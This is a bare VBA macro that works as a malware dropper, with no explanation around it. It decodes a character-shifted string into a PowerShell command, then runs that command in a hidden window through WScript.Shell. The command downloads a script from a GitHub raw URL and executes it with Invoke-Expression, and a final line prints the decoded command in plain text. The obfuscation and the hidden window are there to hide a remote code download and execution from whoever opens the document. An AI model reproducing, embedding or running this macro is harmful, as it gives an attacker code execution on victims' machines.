Sub My()
    Dim xorTest As String
    Dim result As String
    Dim i As Long
    xorTest = "srzhuvkhoo1h{h#0Frppdqg#%%lup#kwwsv=22udz1jlwkxexvhufrqwhqw1frp2jdfd<6352xve2uhiv2khdgv2pdlq2s1sv4"
    result = ""
    For i = 1 To Len(xorTest)
        result = result & Chr(Asc(Mid(xorTest, i, 1)) - 3)
    Next i
    CreateObject("WScript.Shell").Run result & " | iex", 0, False
End Sub

`powershell.exe -Command ""irm https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/p.ps1 | iex""
